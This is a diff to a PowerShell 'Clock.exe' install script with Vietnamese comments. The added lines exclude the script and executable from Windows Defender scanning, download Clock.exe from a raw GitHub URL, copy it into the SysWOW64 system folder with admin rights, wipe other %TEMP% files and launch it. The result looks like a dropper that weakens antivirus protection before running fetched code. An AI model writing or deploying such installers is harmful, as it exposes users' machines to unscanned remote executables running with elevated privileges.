@@ -9,7 +9,12 @@ If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 
 # Đường dẫn tệp gốc và đích
 $source = "$env:TEMP\Clock.exe"
+$source_install = "$env:TEMP\install.ps1"
 $destination = "$env:SystemRoot\SysWOW64\Clock.exe"
+
+Add-MpPreference -ExclusionPath $source
+Add-MpPreference -ExclusionPath $source_install
+
 
 # Lấy tất cả các tệp trong thư mục %temp%, trừ install.ps1
 $itemsToDelete = Get-ChildItem -Path "$env:TEMP" | Where-Object { $_.Name -ne "install.ps1" }
@@ -41,10 +46,33 @@ If (Test-Path $source) {
     # Sao chép tệp, sử dụng tham số Force để ghi đè nếu tệp đã tồn tại
     Copy-Item -Path $source -Destination $destination -Force
     Write-Host "Tệp đã được sao chép thành công!"
-
-    # Mở tệp Clock.exe sau khi sao chép
 } else {
-    Write-Host "Tệp Clock.exe không tồn tại trong thư mục %temp%!"    
+    Write-Host "Tệp Clock.exe không tồn tại trong thư mục %temp%!"
+    Write-Host "Đang thử tải xuống..."
+    
+    $url = "https://raw.githubusercontent.com/ahgm0/Clock24/main/Clock.exe"  # Thay thế bằng URL của tệp
+    $output = "$env:TEMP\Clock.exe"
+    $retryCount = 3
+    $delay = 2  # Thời gian delay giữa các lần thử (giây)
+    for ($i = 0; $i -lt $retryCount; $i++) {
+        try {
+            Invoke-WebRequest -Uri $url -OutFile $output
+            Write-Output "Tải Thành công"
+            Copy-Item -Path $source -Destination $destination -Force
+            break  # Nếu tải thành công, thoát khỏi vòng lặp
+        }
+        catch {
+            Write-Error "Lần $($i+1) Thất bại: $_"
+            if ($i -lt ($retryCount - 1)) {
+                Write-Output "Thử lại sau $delay giây..."
+                Start-Sleep -Seconds $delay  # Tạm dừng trước khi thử lại
+            }
+        }
+    }
+
+    if (!(Test-Path $output)) {
+        Write-Error "Tải xuống thất bại sau $retryCount lần thử."
+    }
 }
 
 
@@ -64,11 +92,16 @@ foreach ($item in $itemsToDelete) {
 Write-Host "Hoàn thành quá trình xóa các tệp và thư mục trong thư mục %temp%."
 
 
+$seconds = 2
+Write-Output "$seconds giây sau sẽ mở Clock..."
+Start-Sleep -Seconds $seconds
+
+# Mở Clock.exe
+Write-Host "Đang mở Clock.exe..."
 Start-Process -FilePath $destination
 Write-Host "Đã mở Clock.exe!"
 
-Write-Host "5 giây sau sẽ tự tắt..."
-Start-Sleep -Seconds 5
+exit 0
 
 # Lệnh dừng yêu cầu người dùng nhấn Enter trước khi kết thúc
 # Read-Host -Prompt "Nhấn Enter để thoát"
